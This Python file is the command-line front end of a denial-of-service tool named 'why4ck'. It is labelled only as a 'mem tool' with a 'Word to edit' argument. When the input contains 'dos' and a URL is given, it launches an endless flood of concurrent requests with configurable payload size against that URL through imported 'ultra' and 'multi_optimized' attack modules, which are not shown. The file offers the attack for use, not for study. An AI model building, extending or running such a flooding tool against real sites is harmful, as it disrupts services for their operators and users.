import argparse
import sys
import asyncio
from colorama import init, Fore, Style
from . import multi
from . import ultra
from . import multi_optimized

# Initialize colorama
init(autoreset=True)

def cli():
    asyncio.run(_cli_async())

async def _cli_async():
    parser = argparse.ArgumentParser(prog='why4ck', description='mem tool', allow_abbrev=False)
    parser.add_argument('word', help='Word to edit')
    parser.add_argument('--url', help='URL to process')
    parser.add_argument('--session', type=int, default=1, help='Number of sessions for ultra mode')
    parser.add_argument('--concurrency', type=int, default=200, help='Concurrency per session')
    parser.add_argument('--size', type=int, default=1, help='Payload size in KB per request')
    args = parser.parse_args()
    text = args.word
    
    if 'dos' in text:
        if args.url and ('https' in args.url or 'http' in args.url):
            session_count = args.session
            payload_size_kb = args.size
            
            if session_count > 1:
                # Ultra mode - OPTIMIZED multiple multi sessions
                print(f'{Fore.CYAN}ULTRA mode (OPTIMIZED): {session_count} sessions{Style.RESET_ALL}')
                await ultra.ultra_main(
                    url=args.url,
                    sessions=session_count,
                    concurrency=args.concurrency,
                    is_inf=True,
                    payload_size_kb=payload_size_kb
                )
            else:
                # Regular multi mode - use session count or default to 1
                print(f'{Fore.GREEN}Running optimized multi-session...{Style.RESET_ALL}')
                await multi_optimized.run_optimized_attack(
                    url=args.url,
                    sessions=1,  # Fixed: use 1 session when --session 1 is specified
                    concurrency=args.concurrency,
                    is_inf=True,
                    payload_size_kb=payload_size_kb
                )
        else:
            print(f"{Fore.RED}Please provide a valid URL with --url flag{Style.RESET_ALL}")
